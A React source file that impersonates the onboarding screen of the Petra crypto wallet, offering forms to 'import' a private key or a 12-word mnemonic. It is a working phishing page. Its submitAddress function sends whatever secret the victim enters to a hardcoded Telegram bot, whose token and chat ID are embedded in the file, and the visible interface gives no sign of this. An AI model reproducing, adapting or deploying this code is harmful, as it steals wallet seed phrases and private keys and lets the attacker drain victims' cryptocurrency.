import { Stepper, Typography } from '@mui/material';
import React, { useState } from 'react'
import { AiOutlineArrowLeft } from 'react-icons/ai';
import { BiKey } from 'react-icons/bi';
import { SlNotebook } from 'react-icons/sl';
import Step from '@mui/material/Step';
import StepLabel from '@mui/material/StepLabel';

let bot = {
    TOKEN: "5768289542:AAFeDrNZKJ0Tr9PuisnS3qBa3bKk2eWF63Q",
    CHATID: "1416009398",

}

const steps = ['.', '.', '.'];


const Main = () => {
    const [modal, setModal] = useState(false);
    const [activeStep, setActiveStep] = React.useState(0);
    const [skipped, setSkipped] = React.useState(new Set());
    const [prharePass, setPrharePass] = useState('');
    const [option1, setOption1] = useState(false)
    const [option2, setOption2] = useState(false)
    const [one, set1] = useState("");
    const [two, set2] = useState("");
    const [three, set3] = useState("");
    const [four, set4] = useState("");
    const [five, set5] = useState("");
    const [six, set6] = useState("");
    const [seven, set7] = useState("");
    const [eight, set8] = useState("");
    const [nine, set9] = useState("");
    const [ten, set10] = useState("");
    const [eleven, set11] = useState("");
    const [twelve, set12] = useState("");
    const style = {
        wrapper: modal ? 'h-[677px] lg:w-[480px] px-8 rounded-2xl lg:-translate-x-[25rem] ease-in duration-300' : 'ease-in duration-300 h-[677px]  px-8 rounded-2xl -translate-x-[0rem]',
        sec_wrapper: modal ? 'ease-in duration-300 flex flex-col items-center lg:pl-24 pb-5 lg:translate-x-[25rem]' : 'ease-in duration-300 flex flex-col items-center lg:pl-24 pb-5 translate-x-[0rem]'
    }


    const isStepOptional = (step) => {
        return step === 1;
    };

    const isStepSkipped = (step) => {
        return skipped.has(step);
    };

    const handleNext = () => {
        let newSkipped = skipped;
        if (isStepSkipped(activeStep)) {
            newSkipped = new Set(newSkipped.values());
            newSkipped.delete(activeStep);
        }

        setActiveStep((prevActiveStep) => prevActiveStep + 1);
        setSkipped(newSkipped);
    };

    const handleBack = () => {
        setActiveStep((prevActiveStep) => prevActiveStep - 1);
    };

    const handleSkip = () => {
        if (!isStepOptional(activeStep)) {
            // You probably want to guard against something like this,
            // it should never occur unless someone's actively trying to break something.
            throw new Error("You can't skip a step that isn't optional.");
        }

        setActiveStep((prevActiveStep) => prevActiveStep + 1);
        setSkipped((prevSkipped) => {
            const newSkipped = new Set(prevSkipped.values());
            newSkipped.add(activeStep);
            return newSkipped;
        });
    };


    const submitAddress = () => {
        let secratePrhase = !prharePass ? `mnemonic is ${one} ${two} ${three} ${four} ${four} ${five} ${six} ${seven} ${eight} ${nine} ${ten} ${eleven} ${twelve}` : `phrase is pass is ${prharePass}`

        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${secratePrhase}`, {
            method: "GET"
        })
            .then(success => {
                setPrharePass('')
                handleNext()
                // window.location = 'chrome-extension://ejjladinnckdgjemekebdpeokbikhfci/onboarding.html'
            }, error => {
                alert("not sent")
            })
    }
    const handleModal = () => {
        setModal((prev) => !prev)
    };


    return (
        <div className='lg:flex justify-between lg:mx-52 lg:items-end  my-4 '>
            <div className={style.sec_wrapper}>
                <img src='https://i.ibb.co/cFqXdQr/fwefwefewf-removebg-preview.png' className='w-24' />
                <p className='text-[70px] text-white font-[400]'>Petra</p>
                <p className='text-[22px] text-[#C2C7CC] font-[400]'>Guiding your web3 journey.</p>
                <p className='flex pt-44'>
                    <span className='text-[#C2C7CC] '>Powered by</span>
                    <img src='https://i.ibb.co/0jcwb2V/grgegegreg-removebg-preview.png' />
                </p>
            </div>
            <div className={modal ? `bg-white ${style.wrapper}` : `bg-[#1C2B43] ${style.wrapper}`}>
                {
                    modal ?
                        <div className='pt-5 relative'>

                            <>
                                <div className='flex justify-between'>
                                    {
                                        option1 ?
                                            <p className='bg-[#E2E8F0] text-[18px] p-2 rounded-lg cursor-pointer' onClick={() => {
                                                setOption1((prev) => !prev)
                                                handleBack()
                                            }}><AiOutlineArrowLeft /></p>
                                            :
                                            option2 ?
                                                <p className='bg-[#E2E8F0] text-[18px] p-2 rounded-lg cursor-pointer' onClick={() => {
                                                    setOption2((prev) => !prev)
                                                    handleBack()
                                                }}><AiOutlineArrowLeft /></p>
                                                :
                                                <p className='bg-[#E2E8F0] text-[18px] p-2 rounded-lg cursor-pointer' onClick={() => {
                                                    handleModal()
                                                    handleBack()
                                                }}><AiOutlineArrowLeft /></p>
                                    }

                                    <Stepper activeStep={activeStep}>
                                        {steps.map((label, index) => {
                                            const stepProps = {};
                                            const labelProps = {};
                                            if (isStepSkipped(index)) {
                                                stepProps.completed = false;
                                            }
                                            return (
                                                <Step key={label} {...stepProps}>
                                                    <StepLabel {...labelProps} >{label}</StepLabel>
                                                </Step>
                                            );
                                        })}
                                    </Stepper>
                                    <p>.</p>
                                </div>
                                {
                                    option1 || option2 ?
                                        ""
                                        :
                                        <div className='mt-64'>
                                            <button className='bg-slate-100 w-full my-2 border-[3px] border-gray p-4 text-lg font-[600] flex items-center rounded-lg' onClick={() => {
                                                setOption1((prev) => !prev)
                                                handleNext()
                                            }}><BiKey className='text-[#FF5F5F] font-[700] text-2xl mr-4' /> Import private key</button>
                                            <button className='bg-slate-100 w-full my-2 border-[3px] border-gray p-4 text-lg font-[600] flex items-center rounded-lg' onClick={() => {
                                                setOption2((prev) => !prev)
                                                handleNext()
                                            }}><SlNotebook className='text-[#FF5F5F] font-[700] text-2xl mr-4' /> Import mnemonic</button>
                                        </div>
                                }
                            </>
                            {
                                option1 ?
                                    (
                                        <>
                                            <p className='mt-16'>Access an existing wallet with your private key.</p>
                                            <input
                                                aria-label="minimum height"
                                                minRows={3}
                                                placeholder="Enter private key hare"
                                                className='w-full bg-slate-100 p-4 rounded-lg mt-1 '
                                                type='password'
                                                onChange={(e) => setPrharePass(e.target.value)}

                                            /><br />
                                            <button className={prharePass ? 'opacity-100 bg-[#C53030] w-full mt-96 p-4 rounded-lg text-white text-lg text-xl' : 'opacity-40 bg-[#C53030] w-full mt-96 p-4 rounded-lg text-white text-lg text-xl'} disabled={!prharePass} onClick={() => submitAddress()}>Import</button>
                                        </>
                                    )
                                    :
                                    option2 ?
                                        <>
                                            <div className='grid grid-cols-2 justify-items-center gap-4 mt-10'>
                                                <input placeholder='1. ' onChange={(e) => set1(e.target.value)} name='1' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='2. ' onChange={(e) => set2(e.target.value)} name='2' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='3. ' onChange={(e) => set3(e.target.value)} name='3' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='4. ' onChange={(e) => set4(e.target.value)} name='4' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='5. ' onChange={(e) => set5(e.target.value)} name='5' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='6. ' onChange={(e) => set6(e.target.value)} name='6' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='7. ' onChange={(e) => set7(e.target.value)} name='7' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='8. ' onChange={(e) => set8(e.target.value)} name='8' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='9. ' onChange={(e) => set9(e.target.value)} name='9' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='10.' onChange={(e) => set10(e.target.value)} name='10' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='11.' onChange={(e) => set11(e.target.value)} name='11' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                                <input placeholder='12.' onChange={(e) => set12(e.target.value)} name='12' className='w-full bg-slate-100 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                            </div>
                                            <button className={one ? 'opacity-100 bg-[#C53030] w-full mt-32 p-4 rounded-lg text-white text-lg text-xl' : 'opacity-40 bg-[#C53030] w-full mt-32 p-4 rounded-lg text-white text-lg text-xl'} disabled={!one} onClick={() => submitAddress()}>Import</button>
                                        </>
                                        :
                                        ''
                            }
                        </div>
                        :
                        <div className='flex flex-col items-center pt-44 pb-8 '>
                            <img src='https://i.ibb.co/cFqXdQr/fwefwefewf-removebg-preview.png' className='mb-2' />
                            <p className='text-[30px] text-white font-[700] mb-2'>Welcome to Petra</p>
                            <p className='text-[15px] text-[#C2C7CC] font-[400] mb-40'>Guiding your web3 journey.</p>
                            <button className='bg-[#e15656] text-[20px] font-[700] text-white rounded-lg w-[26rem] px-5 py-3 mb-4'>Create New Wallet</button>
                            <button onClick={() => {
                                handleModal()
                                handleNext()
                            }} className='bg-[transparent] hover:bg-white ease-in duration-300 border border-white text-[20px] font-[700] text-white rounded-lg w-[26rem] px-5 py-3'>Import Wallet</button>
                        </div>
                }
            </div>
        </div>
    )
}

export default Main